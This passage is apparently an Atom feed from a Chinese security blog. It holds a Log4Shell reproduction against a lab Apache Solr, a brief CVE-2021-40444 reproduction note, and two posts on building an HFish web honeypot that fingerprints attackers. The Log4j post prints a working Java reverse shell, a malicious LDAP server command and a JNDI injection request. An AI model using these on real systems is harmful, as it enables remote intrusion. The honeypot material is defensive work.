href="#漏洞检测" class="headerlink" title="漏洞检测"></a>漏洞检测</h2><p>通过burp扩展插件和dnslog日志查看漏洞信息</p><p><img src="https://pic.rmb.bdstatic.com/bjh/2fed9b14b1f5b797d6187aebb1eac0c4.png" alt="image.png"></p><p><img src="https://pic.rmb.bdstatic.com/bjh/c1248dcb406a40572fe810fad186f0c7.png" alt="image.png"></p><p>这里确认indexInfo参数触发漏洞</p><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>参考fastjson漏洞利用，利用恶意ldap服务器进行jndi注入，加载远程恶意类，造成任意代码执行</p><h3 id="恶意类"><a href="#恶意类" class="headerlink" title="恶意类"></a>恶意类</h3><p>这里先写一个恶意类 Exploit.java，并编译为class文件</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.OutputStream;</span><br><span class="line"><span class="keyword">import</span> java.net.Socket;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Exploit</span> </span>&#123;</span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="title">Exploit</span><span class="params">()</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    String host=<span class="string">&quot;x.x.x.x&quot;</span>;  <span class="comment">//修改为反弹服务器</span></span><br><span class="line">    <span class="keyword">int</span> port=x;  <span class="comment">// 修改为反连端口</span></span><br><span class="line">    String cmd=<span class="string">&quot;/bin/sh&quot;</span>;</span><br><span class="line">    Process p=<span class="keyword">new</span> ProcessBuilder(cmd).redirectErrorStream(<span class="keyword">true</span>).start();</span><br><span class="line">    Socket s=<span class="keyword">new</span> Socket(host,port);</span><br><span class="line">    InputStream pi=p.getInputStream(),pe=p.getErrorStream(),si=s.getInputStream();</span><br><span class="line">    OutputStream po=p.getOutputStream(),so=s.getOutputStream();</span><br><span class="line">    <span class="keyword">while</span>(!s.isClosed()) &#123;</span><br><span class="line">      <span class="keyword">while</span>(pi.available()&gt;<span class="number">0</span>)</span><br><span class="line">        so.write(pi.read());</span><br><span class="line">      <span class="keyword">while</span>(pe.available()&gt;<span class="number">0</span>)</span><br><span class="line">        so.write(pe.read());</span><br><span class="line">      <span class="keyword">while</span>(si.available()&gt;<span class="number">0</span>)</span><br><span class="line">        po.write(si.read());</span><br><span class="line">      so.flush();</span><br><span class="line">      po.flush();</span><br><span class="line">      Thread.sleep(<span class="number">50</span>);</span><br><span class="line">      <span class="keyword">try</span> &#123;</span><br><span class="line">        p.exitValue();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;;</span><br><span class="line">    p.destroy();</span><br><span class="line">    s.close();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="直接使用python启动服务"><a href="#直接使用python启动服务" class="headerlink" title="直接使用python启动服务"></a>直接使用python启动服务</h3><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -m SimpleHTTPServer <span class="number">80</span>  <span class="regexp">//</span>xxx为web端口</span><br></pre></td></tr></table></figure><h3 id="启动恶意ldap服务器"><a href="#启动恶意ldap服务器" class="headerlink" title="启动恶意ldap服务器"></a>启动恶意ldap服务器</h3><p>之前复现fastjson的直接拿过来用</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">java</span> -cp marshalsec-<span class="number">0</span>.<span class="number">0</span>.<span class="number">3</span>-SNAPSHOT-<span class="literal">all</span>.jar marshalsec.jndi.LDAPRefServer http://x.x.x.x/#Exploit xxx //xxx为ldap端口</span><br></pre></td></tr></table></figure><h3 id="nc-监听反连端口"><a href="#nc-监听反连端口" class="headerlink" title="nc 监听反连端口"></a>nc 监听反连端口</h3><p>nc -lvvp x //x 为恶意类指定的反连端口</p><h3 id="触发漏洞"><a href="#触发漏洞" class="headerlink" title="触发漏洞"></a>触发漏洞</h3><p>发送请求</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">GET</span> /solr/admin/cores?_=<span class="number">1639731882458</span>&amp;wt=json&amp;indexInfo=<span class="variable">$&#123;jndi:ldap://x.x.x.x:xxx/#Exploit&#125;</span> HTTP/<span class="number">1</span>.<span class="number">1</span></span><br><span class="line"><span class="attribute">Host</span>: <span class="number">192.168.64.128:8983</span></span><br><span class="line"><span class="attribute">X</span>-Requested-With: XMLHttpRequest</span><br><span class="line"><span class="attribute">Referer</span>: http://<span class="number">192.168.64.128:8983</span>/solr/</span><br><span class="line"><span class="attribute">Cookie</span>: JSESSIONID=<span class="number">066</span>F<span class="number">1</span>A<span class="number">7579</span>CF<span class="number">0</span>FC<span class="number">0</span>C<span class="number">94</span>C<span class="number">097160</span>C<span class="number">692</span>F<span class="number">6</span></span><br><span class="line"><span class="attribute">Connection</span>: close</span><br></pre></td></tr></table></figure><p>查看ldap服务器响应</p><p><img src="https://pic.rmb.bdstatic.com/bjh/268b35659c86937787fd5f490767e9b9.png" alt="image.png"></p><p>查看web服务响应</p><p><img src="https://pic.rmb.bdstatic.com/bjh/cfffa3ddd7d59e6696113a8b3d857e2d.png" alt="image.png"></p><p>查看nc监听，可以看到拿到shell了<br><img src="https://pic.rmb.bdstatic.com/bjh/179763afe5257feb006fce33d55c4568.png" alt="image.png"></p><p>这里可以看到拿到shell了，这里吐槽一下某SRC，修复窗口都一周了，补丁没打完，SRC还不收漏洞，低内核版本的linux，可脏牛提权，直接忽略</p><h2 id="修复建议"><a href="#修复建议" class="headerlink" title="修复建议"></a>修复建议</h2><p>升级log4j到 2.15.0-rc2以上/添加jvm参数 -Dlog4j2.formatMsgNoLookups=true/使用rasp防护/删除jndilookup都可以</p>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;漏洞描述&quot;&gt;&lt;a href=&quot;#漏洞描述&quot; class=&quot;headerlink&quot; title=&quot;漏洞描述&quot;&gt;&lt;/a&gt;漏洞描述&lt;/h2&gt;&lt;p&gt;Apache Log4j2是一款优秀的Java日志框架。2021年11月24日，阿里云安全团队向Apache官方报告了Apache Log4j2远程代码执行漏洞。由于Apache Log4j2某些功能存在递归解析功能，攻击者可直接构造恶意请求，触发远程代码执行漏洞。漏洞利用无需特殊配置，经阿里云安全团队验证，Apache Struts2、Apache Solr、Apache Druid、Apache Flink等均受影响。&lt;/p&gt;</summary>
    
    
    
    <category term="应急响应" scheme="http://www.pa55w0rd.online/categories/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/"/>
    
    
    <category term="应急响应" scheme="http://www.pa55w0rd.online/tags/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/"/>
    
  </entry>
  
  <entry>
    <title>CVE-2021-40444 复现</title>
    <link href="http://www.pa55w0rd.online/CVE-2021-40444/"/>
    <id>http://www.pa55w0rd.online/CVE-2021-40444/</id>
    <published>2021-09-13T08:38:27.000Z</published>
    <updated>2021-09-13T08:48:45.855Z</updated>
    
    <content type="html"><![CDATA[<p>Microsoft MSHTML 远程代码执行漏洞（CVE-2021-40444），攻击者可通过制作带有恶意 ActiveX 控件的 Microsoft Office 文档并诱导用户打开此文档来利用此漏洞，成功利用此漏洞的远程攻击者可在目标系统上以该用户权限执行任意代码。</p><p>在GitHub发现该漏洞的POC，先弹个计算器试试</p><span id="more"></span><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">GitHub项目地址：https:<span class="regexp">//gi</span>thub.com<span class="regexp">/lockedbyte/</span>CVE-<span class="number">2021</span>-<span class="number">40444</span></span><br><span class="line">Windows <span class="number">10</span> 专业版 <span class="number">21</span>H1 </span><br><span class="line">操作系统版本：<span class="number">19043.1165</span></span><br><span class="line">Office版本：电脑自带的 Home and Student <span class="number">2019</span></span><br><span class="line">操作系统和Office补丁均已升级到最新</span><br></pre></td></tr></table></figure><p>按照GitHub的readme一步步操作</p><img src="/CVE-2021-40444/cve-2021-40444%E5%A4%8D%E7%8E%B0.gif" class="" title="描述">]]></content>
    
    
    <summary type="html">&lt;p&gt;Microsoft MSHTML 远程代码执行漏洞（CVE-2021-40444），攻击者可通过制作带有恶意 ActiveX 控件的 Microsoft Office 文档并诱导用户打开此文档来利用此漏洞，成功利用此漏洞的远程攻击者可在目标系统上以该用户权限执行任意代码。&lt;/p&gt;
&lt;p&gt;在GitHub发现该漏洞的POC，先弹个计算器试试&lt;/p&gt;</summary>
    
    
    
    <category term="应急响应" scheme="http://www.pa55w0rd.online/categories/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/"/>
    
    
    <category term="应急响应" scheme="http://www.pa55w0rd.online/tags/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/"/>
    
  </entry>
  
  <entry>
    <title>魔改开源版本HFish - 溯源2 fingerprintjs</title>
    <link href="http://www.pa55w0rd.online/hfish-fingerprintjs/"/>
    <id>http://www.pa55w0rd.online/hfish-fingerprintjs/</id>
    <published>2021-08-30T10:11:26.000Z</published>
    <updated>2021-08-30T10:32:13.157Z</updated>
    
    <content type="html"><![CDATA[<h2 id="FingerprintJS"><a href="#FingerprintJS" class="headerlink" title="FingerprintJS"></a>FingerprintJS</h2><p>FingerprintJS 是一个浏览器指纹库，可查询浏览器属性并从中计算出散列的访问者标识符。与 cookie 和本地存储不同，指纹在隐身/隐私模式下保持不变，即使浏览器数据被清除。</p><span id="more"></span><p>项目地址：<a href="https://github.com/fingerprintjs/fingerprintjs">https://github.com/fingerprintjs/fingerprintjs</a></p><h2 id="简单使用"><a href="#简单使用" class="headerlink" title="简单使用"></a>简单使用</h2><p>通过调用该库，会返回一个hash字符串，标识访问用户的唯一值</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">  <span class="comment">// Initialize the agent at application startup.</span></span><br><span class="line">  <span class="keyword">const</span> fpPromise = <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function">(<span class="params">resolve, reject</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> script = <span class="built_in">document</span>.createElement(<span class="string">&#x27;script&#x27;</span>)</span><br><span class="line">    script.onload = resolve</span><br><span class="line">    script.onerror = reject</span><br><span class="line">    script.async = <span class="literal">true</span></span><br><span class="line">    script.src = <span class="string">&#x27;https://cdn.jsdelivr.net/npm/&#x27;</span></span><br><span class="line">      + <span class="string">&#x27;@fingerprintjs/fingerprintjs@3/dist/fp.min.js&#x27;</span></span><br><span class="line">    <span class="built_in">document</span>.head.appendChild(script)</span><br><span class="line">  &#125;)</span><br><span class="line">    .then(<span class="function">() =&gt;</span> FingerprintJS.load())</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Get the visitor identifier when you need it.</span></span><br><span class="line">  fpPromise</span><br><span class="line">    .then(<span class="function"><span class="params">fp</span> =&gt;</span> fp.get())</span><br><span class="line">    .then(<span class="function"><span class="params">result</span> =&gt;</span> &#123;</span><br><span class="line">      <span class="comment">// This is the visitor identifier:</span></span><br><span class="line">      <span class="keyword">const</span> visitorId = result.visitorId</span><br><span class="line">      <span class="built_in">console</span>.log(visitorId)</span><br><span class="line">    &#125;)</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><h2 id="最后效果图"><a href="#最后效果图" class="headerlink" title="最后效果图"></a>最后效果图</h2><p>该js放在存在漏洞的页面或者登录后的页面</p><p><img src="https://pic.rmb.bdstatic.com/bjh/bf59073eb7119969dc936eba7771f921.png" alt="image.png"></p>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;FingerprintJS&quot;&gt;&lt;a href=&quot;#FingerprintJS&quot; class=&quot;headerlink&quot; title=&quot;FingerprintJS&quot;&gt;&lt;/a&gt;FingerprintJS&lt;/h2&gt;&lt;p&gt;FingerprintJS 是一个浏览器指纹库，可查询浏览器属性并从中计算出散列的访问者标识符。与 cookie 和本地存储不同，指纹在隐身/隐私模式下保持不变，即使浏览器数据被清除。&lt;/p&gt;</summary>
    
    
    
    <category term="安全建设" scheme="http://www.pa55w0rd.online/categories/%E5%AE%89%E5%85%A8%E5%BB%BA%E8%AE%BE/"/>
    
    
    <category term="蜜罐" scheme="http://www.pa55w0rd.online/tags/%E8%9C%9C%E7%BD%90/"/>
    
    <category term="开源" scheme="http://www.pa55w0rd.online/tags/%E5%BC%80%E6%BA%90/"/>
    
  </entry>
  
  <entry>
    <title>魔改开源版本HFish - 高交互Web蜜罐</title>
    <link href="http://www.pa55w0rd.online/hfish-web/"/>
    <id>http://www.pa55w0rd.online/hfish-web/</id>
    <published>2021-08-19T01:57:14.000Z</published>
    <updated>2021-08-19T07:04:16.874Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>这里魔改的HFish指的是三斤大佬维护的版本，现在的版本为闭源免费使用。</p><p>考虑到蜜罐的使用场景，主要为伪装成开放端口、服务和对外的web服务</p><p>经过测试，这个版本的HFish，无法捕获全端口位置扫描，当然可以通过自定义配置端口监听，可实现端口TCP三次握手后的捕获，syn扫描无法捕获</p><p>部署在内网，在我看来，不需要太多的交互，低交互蜜罐就够用了，及时发现内网中的异常行为，我在内网部署了一套OpenCanray低交互蜜罐，这里推荐美团大佬 P师傅 <code>p1r06u3</code> 的项目<code>https://github.com/p1r06u3/opencanary_web</code>，提供了web端管理后台</p><p>这篇文章写一下我对web蜜罐的一些想法</p><span id="more"></span><h2 id="诱饵"><a href="#诱饵" class="headerlink" title="诱饵"></a>诱饵</h2><p>web蜜罐，需要一个交互式的web网站，我用了fastadmin框架模拟了一个web后台，申请了一个比较有诱惑力的域名，如admin1、admins、sysadmin、sadmin、adminer、devadmin、testadmin、loginadmin、wpadmin等等，登陆的前端代码注释里面留一下测试账号等等</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--username:test password:test --&gt;</span></span><br></pre></td></tr></table></figure><p>这里和HFish 自带的web蜜罐报警不一样，因为是高交互，有后台，这里对暴力破解不会产生报警，只有<code>登陆成功才会触发报警</code></p><p>这样有一个好处就是，对外仅保留web蜜罐，蜜罐上报接口和key不会暴漏</p><h2 id="改造"><a href="#改造" class="headerlink" title="改造"></a>改造</h2><p>HFish 对于web的上报接口主要有3个</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">web_url = /api/v1/post/report                   <span class="comment"># WEB蜜罐上报 API</span></span><br><span class="line">deep_url = /api/v1/post/deep_report             <span class="comment"># 暗网蜜罐上报 API</span></span><br><span class="line">plug_url = /api/v1/post/plug_report             <span class="comment"># 插件蜜罐上报 API</span></span><br></pre></td></tr></table></figure><p>做一下区分：</p><p>其中plug接口用于做<code>攻击行为感知</code></p><p>deep接口用于接收<code>登陆成功</code>或<code>攻击成功</code>的告警</p><p>web接口用于接收<code>文件操作</code>、<code>命令监控</code>、<code>溯源</code>等信息</p><p>这里修改一下deep接口的代码，ip通过表单提交，因为登陆成功和攻击成功，都是在后台上报，无法在客户端获取</p><p><code>/view/api/view.go</code></p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">ReportDeepWeb</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line">    ...</span><br><span class="line">    ip := c.PostForm(<span class="string">&quot;ip&quot;</span>)</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="登陆成功告警"><a href="#登陆成功告警" class="headerlink" title="登陆成功告警"></a>登陆成功告警</h2><p>找到后台登陆逻辑<br><code>/fastadmin/application/admin/controller/Index.php</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">login</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    ...</span><br><span class="line">    <span class="variable">$result</span> = <span class="keyword">$this</span>-&gt;auth-&gt;login(<span class="variable">$username</span>, <span class="variable">$password</span>, <span class="variable">$keeplogin</span> ? <span class="number">86400</span> : <span class="number">0</span>);</span><br><span class="line">    <span class="variable">$username</span> = <span class="keyword">$this</span>-&gt;request-&gt;post(<span class="string">&#x27;username&#x27;</span>);</span><br><span class="line">    <span class="variable">$password</span> = <span class="keyword">$this</span>-&gt;request-&gt;post(<span class="string">&#x27;password&#x27;</span>);</span><br><span class="line">    <span class="variable">$ip</span> = <span class="keyword">$this</span>-&gt;request-&gt;ip();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$result</span> === <span class="literal">true</span>) &#123;</span><br><span class="line">        <span class="variable">$url1</span> = <span class="string">&quot;http://127.0.0.1:8080/api/v1/post/deep_report&quot;</span>;</span><br><span class="line">        <span class="variable">$name</span> = <span class="string">&quot;后台登录成功告警&quot;</span>;</span><br><span class="line">        <span class="variable">$jsonStr</span> = <span class="string">&quot;<span class="subst">$name</span>&amp;info=<span class="subst">$username</span>%26%26<span class="subst">$password</span>&amp;sec_key=xxx&amp;ip=<span class="subst">$ip</span>&quot;</span>;</span><br><span class="line">        <span class="variable">$a</span> = <span class="keyword">$this</span>-&gt;request_by_curl(<span class="variable">$url1</span>, <span class="variable">$jsonStr</span>);</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="攻击行为感知"><a href="#攻击行为感知" class="headerlink" title="攻击行为感知"></a>攻击行为感知</h2><p>这里参考：HFish 插件 (任意站点,皆可蜜罐)，通过nginx + lua，将请求头和请求体发送到蜜罐，就是存放完整的访问日志，在检测到攻击告警时，通过分析日志来判断攻击者做了什么操作</p><p>这里省事，直接安装OpenResty </p><p>这里从docker镜像里，把lua脚本扒出来</p><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">local</span> cjson = <span class="built_in">require</span> <span class="string">&quot;cjson&quot;</span></span><br><span class="line"><span class="keyword">local</span> http = <span class="built_in">require</span> <span class="string">&quot;resty.http&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">local</span> <span class="function"><span class="keyword">function</span> <span class="title">http_post</span><span class="params">(url, body)</span></span></span><br><span class="line">    <span class="keyword">local</span> httpc = http.new()</span><br><span class="line">    httpc:set_timeout(<span class="number">30000</span>)</span><br><span class="line">    <span class="keyword">local</span> res, err_ = httpc:request_uri(url, &#123;</span><br><span class="line">        method = <span class="string">&quot;POST&quot;</span>,</span><br><span class="line">        body = body,</span><br><span class="line">        headers = &#123;[<span class="string">&quot;Content-Type&quot;</span>] = <span class="string">&quot;application/json&quot;</span>&#125;</span><br><span class="line">    &#125;)</span><br><span class="line">    httpc:set_keepalive(<span class="number">5000</span>, <span class="number">100</span>)</span><br><span class="line">    httpc:<span class="built_in">close</span>()</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">local</span> <span class="function"><span class="keyword">function</span> <span class="title">get_data</span><span class="params">()</span></span></span><br><span class="line">    <span class="keyword">local</span> data = &#123;</span><br><span class="line">        host = ngx.var.host,</span><br><span class="line">        uri = ngx.var.uri,</span><br><span class="line">        method = ngx.var.request_method,</span><br><span class="line">        remote_addr = ngx.var.http_x_forwarded_for,</span><br><span class="line">        time_local = ngx.var.time_local,</span><br><span class="line">        http_user_agent = ngx.var.http_user_agent,</span><br><span class="line">        request_time = ngx.var.request_time</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;GET&quot;</span> == ngx.var.request_method <span class="keyword">then</span></span><br><span class="line">        data[<span class="string">&quot;args&quot;</span>] = ngx.req.get_uri_args()</span><br><span class="line">    <span class="keyword">elseif</span> <span class="string">&quot;POST&quot;</span> == ngx.var.request_method <span class="keyword">then</span></span><br><span class="line">        ngx.req.read_body()</span><br><span class="line">        data[<span class="string">&quot;args&quot;</span>] = ngx.req.get_post_args()</span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">string.split</span><span class="params">(input, delimiter)</span></span></span><br><span class="line">        <span class="built_in">input</span> = <span class="built_in">tostring</span>(<span class="built_in">input</span>)</span><br><span class="line">    delimiter = <span class="built_in">tostring</span>(delimiter)</span><br><span class="line">        <span class="keyword">if</span> (delimiter==<span class="string">&#x27;&#x27;</span>) <span class="keyword">then</span> <span class="keyword">return</span> <span class="literal">false</span> <span class="keyword">end</span></span><br><span class="line">    <span class="keyword">local</span> pos,arr = <span class="number">0</span>, &#123;&#125;</span><br><span class="line">    <span class="comment">-- for each divider found</span></span><br><span class="line">    <span class="keyword">for</span> st,sp <span class="keyword">in</span> <span class="function"><span class="keyword">function</span><span class="params">()</span></span> <span class="keyword">return</span> <span class="built_in">string</span>.<span class="built_in">find</span>(<span class="built_in">input</span>, delimiter, pos, <span class="literal">true</span>) <span class="keyword">end</span> <span class="keyword">do</span></span><br><span class="line">        <span class="built_in">table</span>.<span class="built_in">insert</span>(arr, <span class="built_in">string</span>.<span class="built_in">sub</span>(<span class="built_in">input</span>, pos, st - <span class="number">1</span>))</span><br><span class="line">        pos = sp + <span class="number">1</span></span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">    <span class="built_in">table</span>.<span class="built_in">insert</span>(arr, <span class="built_in">string</span>.<span class="built_in">sub</span>(<span class="built_in">input</span>, pos))</span><br><span class="line">    <span class="keyword">return</span> arr</span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">local</span> headers=ngx.req.get_headers()</span><br><span class="line">    <span class="keyword">local</span> clientIP=headers[<span class="string">&quot;X_FORWARDED_FOR&quot;</span>]</span><br><span class="line">    <span class="keyword">if</span> clientIP == <span class="literal">nil</span> <span class="keyword">or</span> <span class="built_in">string</span>.<span class="built_in">len</span>(clientIP) == <span class="number">0</span> <span class="keyword">or</span> clientIP == <span class="string">&quot;unknown&quot;</span> <span class="keyword">then</span></span><br><span class="line">        clientIP = ngx.var.remote_addr    </span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">    <span class="keyword">if</span> clientIP ~= <span class="literal">nil</span> <span class="keyword">and</span> <span class="built_in">string</span>.<span class="built_in">len</span>(clientIP) &gt;<span class="number">15</span>  <span class="keyword">then</span></span><br><span class="line">        <span class="keyword">local</span> pos  = <span class="built_in">string</span>.split(clientIP,<span class="string">&#x27;,&#x27;</span>)</span><br><span class="line">        clientIP = pos[<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">local</span> result = &#123;</span><br><span class="line">        name = ngx.var.hfish_name,</span><br><span class="line">        info = data,</span><br><span class="line">        sec_key = ngx.var.hfish_sec_key,</span><br><span class="line">        ip = clientIP</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> cjson.encode(result)</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">http_post(ngx.var.hfish_api, get_data())</span><br></pre></td></tr></table></figure><p>nginx配置文件添加</p><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">set $hfish_name <span class="string">&#x27;攻击行为感知&#x27;</span>;  # 插件名称</span><br><span class="line">set $hfish_sec_key <span class="string">&#x27;xxx&#x27;</span>;  # 接口安全密钥</span><br><span class="line">set $hfish_api <span class="string">&#x27;http://127.0.0.1:8989/api/v1/post/plug_report&#x27;</span>;    # 插件接口</span><br><span class="line">    # HFish 插件核心模块</span><br><span class="line">access_by_lua_file <span class="string">&#x27;/usr/local/src/honeypot/hfish.lua&#x27;</span>;</span><br></pre></td></tr></table></figure><h2 id="效果图"><a href="#效果图" class="headerlink" title="效果图"></a>效果图</h2><p>攻击行为感知</p><p><img src="https://pic.rmb.bdstatic.com/bjh/59178dfba9e21905b3094555c2f8bfac.png" alt="image.png"></p><p>后台登陆成功，这里可以配合企业微信/钉钉/飞书自动告警及时响应</p><p><img src="https://pic.rmb.bdstatic.com/bjh/7daff985ce0b3d6fd3956a510700f914.png" alt="image.png"></p><p><img src="https://pic.rmb.bdstatic.com/bjh/2a4d8e0b2f16be5334863f827d24ae76.png" alt="image.png"></p><h2 id="没时间研究的"><a href="#没时间研究的" class="headerlink" title="没时间研究的"></a>没时间研究的</h2><p>通过nginx + lua实现更多的功能</p><p><code>参考：蜜罐背后的影子系统探秘 https://cloud.tencent.com/developer/article/1045869</code><br><code>参考：Juggler - 一个也许能骗到黑客的系统 https://github.com/C4o/Juggler</code></p><p>一般场景下我们会在内部部署蜜罐系统，当外部有渗透时，碰到蜜罐就会报警，蜜罐会去检索攻击源的位置，确定别攻击机器的IP端口，取得payload数据，配合IDS我们可以捕获事件的过程，然后采取对应防御措施。还有一种办法，我们可以在蜜罐被触碰的时候，把流量引入到一台具体的机器上，伪装成一个正常的服务，像侦查机一样，收集攻击服务。我们以WEB服务为例，有一个接近真实的HTTP服务器，主动或是被动的配合蜜罐收集更多的数据，当蜜罐发现威胁IP时，运用动态迁移技术，将威胁服务引到到一个提新预备好的WEB服务，记录攻击行业，还原威胁事件。</p><p>负载均衡和灰度测试的WEB服务就是根据特定的用户和被访问机器的负载情况，决定将用户的请求切入到那台服务上。我们也用这种技术， 对有可以行为的攻击请求，进行环境切换。</p><p>我们用Openresty的上流反向代理来实现这种模式。</p>]]></content>
    
    
